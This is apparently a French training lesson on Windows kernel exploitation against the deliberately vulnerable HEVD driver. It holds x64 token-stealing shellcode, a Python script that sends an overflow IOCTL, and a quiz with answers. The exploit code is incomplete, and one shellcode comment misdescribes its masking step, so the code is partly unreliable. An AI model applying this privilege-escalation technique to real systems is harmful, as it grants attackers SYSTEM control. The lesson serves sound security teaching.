# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 282 (6h) : Kernel Exploitation & Driver Security (Windows Kernel Drivers, HEVD HackSys Extreme Vulnerable Driver, Ring 0 Privilege Escalation & Kernel Pool Overflow)

> [!NOTE]
> **Objectif du jour :** Maîtriser le **développement d'exploits au niveau noyau (Kernel Exploitation / Ring 0)** sur systèmes Windows : analyser l'architecture des pilotes de périphériques (Drivers `.sys`), exploiter les vulnérabilités du driver d'entraînement **HEVD (HackSys Extreme Vulnerable Driver)** avec **WinDbg**, manipuler la structure `_TOKEN` pour effectuer une **Escalade de Privilèges Ring 0 à SYSTEM**, et comprendre le mécanisme de **Pool Overflow**.
>
> **Compétences visées :** `EXP-01` (A) — Windows Kernel Exploitation (Ring 0) | `EXP-02` (A) — Driver Security & Token Stealing Shellcode

---

## 1) Module — Architecture Noyau Windows (Ring 0 vs Ring 3) (2h)

### 📖 Narration/Intuition

En architecture système x86/x64, le processeur sépare les privilèges d'exécution en anneaux (Rings). Les applications utilisateur s'exécutent en **Ring 3 (User Mode)**, isolées de la mémoire système. Le noyau Windows et les pilotes de périphériques (Drivers `.sys`) s'exécutent en **Ring 0 (Kernel Mode)** avec un accès illimité à toute la mémoire RAM et aux instructions matérielles. Une vulnérabilité dans un pilote Kernel permet une escalade de privilèges instantanée au compte **NT AUTHORITY\SYSTEM**.

```
[ User Mode - Ring 3 ] ──(IOCTL Request / DeviceIoControl)──► [ Kernel Mode - Ring 0 ]
  Applications, PowerShell                                        ntoskrnl.exe, Drivers (.sys)
  Mémoire Isolée                                                  Accès Total Mémoire RAM
```

---

## 2) Module — Exploitation HEVD : Token Stealing Shellcode (`token_stealing.asm`) (2h)

### 🛠️ Atelier Pratique — Shellcode Assembleur x64 de Vol de Token (Ring 0)

```assembly
; Token Stealing Shellcode x64 pour Windows 10/11 Kernel (Ring 0)
; Remplace le jeton de sécurité du processus courant par le jeton du processus SYSTEM (PID 4)

[BITS 64]
start:
    mov rax, [gs:0x188]       ; Obtenir le KTHREAD courant depuis GS Segment Register
    mov rax, [rax + 0xb8]     ; Obtenir le EPROCESS du processus courant (_KAPC_STATE.Process)
    mov rbx, rax              ; Sauvegarder le pointer EPROCESS courant dans RBX

loop_search:
    mov rax, [rax + 0x448]     ; Obtenir le pointer ActiveProcessLinks (List_Entry)
    sub rax, 0x448            ; Reculer au début de la structure EPROCESS
    cmp qword [rax + 0x440], 4 ; Comparer le UniqueProcessId avec PID 4 (SYSTEM)
    jnz loop_search           ; Boucler jusqu'à trouver le processus SYSTEM

    mov rcx, [rax + 0x4b8]     ; Lire le Token de sécurité du processus SYSTEM
    and cl, 0xf0              ; Conserver les bits de référence (RefFastRef)
    mov [rbx + 0x4b8], rcx     ; Copier le Token SYSTEM dans notre processus courant !

    ret                       ; Retourner proprement au driver
```

---

## 3) Module — Envoi d'IOCTLs malveillants via Python (`hevd_exploit.py`) (2h)

```python
import ctypes
from ctypes import wintypes

# Code d'exploit Kernel — Envoi d'IOCTL vers le driver HEVD (\Device\HackSysExtremeVulnerableDriver)

DEVICE_NAME = r"\\.\HackSysExtremeVulnerableDriver"
HEVD_IOCTL_BUFFER_OVERFLOW = 0x222003 # Code IOCTL vulnérable

kernel32 = ctypes.windll.kernel32

def trigger_kernel_exploit():
    # 1) Ouvrir un handle vers le Device Driver Kernel
    h_device = kernel32.CreateFileW(
        DEVICE_NAME,
        0xC0000000, # GENERIC_READ | GENERIC_WRITE
        0, None, 3, # OPEN_EXISTING
        0, None
    )

    if h_device == -1:
        print("[-] Impossible d'ouvrir le handle vers le driver HEVD. Est-il chargé ?")
        return

    print(f"[+] Handle vers le driver Kernel ouvert : {h_device}")

    # 2) Préparer le Buffer d'attaque pour déclencher le Stack Overflow Kernel
    payload = b"A" * 2080 # Buffer padding pour écraser le RIP de retour Kernel
    # + Adresse de notre Token Stealing Shellcode en mémoire Ring 3

    bytes_returned = wintypes.DWORD()
    # 3) Envoi du paquet IOCTL via DeviceIoControl
    success = kernel32.DeviceIoControl(
        h_device,
        HEVD_IOCTL_BUFFER_OVERFLOW,
        payload, len(payload),
        None, 0,
        ctypes.byref(bytes_returned),
        None
    )

    if success:
        print("[+] IOCTL transmis au noyau avec succès ! Vérifier les privilèges (whoami -> SYSTEM).")

trigger_kernel_exploit()
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **Ring 0 / Ring 3** | Niveaux d'exécution matériels du processeur (Kernel Mode / User Mode) |
| **HEVD** | HackSys Extreme Vulnerable Driver — Driver Kernel Windows d'entraînement à l'exploitation Ring 0 |
| **IOCTL** | Input Output Control — Code de contrôle permettant la communication User Mode ↔ Kernel Driver |
| **EPROCESS** | Structure de données interne du noyau Windows représentant un processus et son jeton de sécurité |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle est la différence majeure de privilèges entre l'exécution en **Ring 3 (User Mode)** et en **Ring 0 (Kernel Mode)** ?
- A) En Ring 0, le code s'exécute avec les privilèges maximaux du processeur et possède un accès direct et non restreint à toute la mémoire RAM et aux structures du noyau
- B) Ring 3 a plus de privilèges que Ring 0
- C) Ring 0 est réservé aux navigateurs web
- D) Il n'y a aucune différence

**Réponse : A**

**Q2 :** Quel est l'objectif de la technique d'escalade de privilèges Kernel appelée **Token Stealing** ?
- A) Remplacer le pointeur de jeton de sécurité (`_TOKEN`) de notre processus courant par le jeton du processus `SYSTEM` (PID 4) dans la structure `EPROCESS` en mémoire Ring 0
- B) Voler des cookies de navigateur
- C) Supprimer les fichiers système
- D) Redémarrer la machine

**Réponse : A**

**Q3 :** Quelle fonction de l'API Windows `kernel32.dll` permet à une application User Mode d'envoyer des commandes et données (IOCTL) à un pilote Kernel ?
- A) `DeviceIoControl()`
- B) `ReadFile()`
- C) `CreateWindow()`
- D) `Socket()`

**Réponse : A**

**Q4 :** Quel est l'identifiant de processus (PID) universellement attribué au processus système maître `SYSTEM` sous Windows ?
- A) PID 4
- B) PID 0
- C) PID 1000
- D) PID 8080

**Réponse : A**

**Q5 :** Quel débogueur officiel Microsoft est l'outil indispensable pour l'analyse et l'ingénierie inverse du noyau Windows (Kernel Debugging) via une connexion série ou réseau (KDNET) ?
- A) WinDbg
- B) OllyDbg
- C) Wireshark
- D) Burp Suite

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
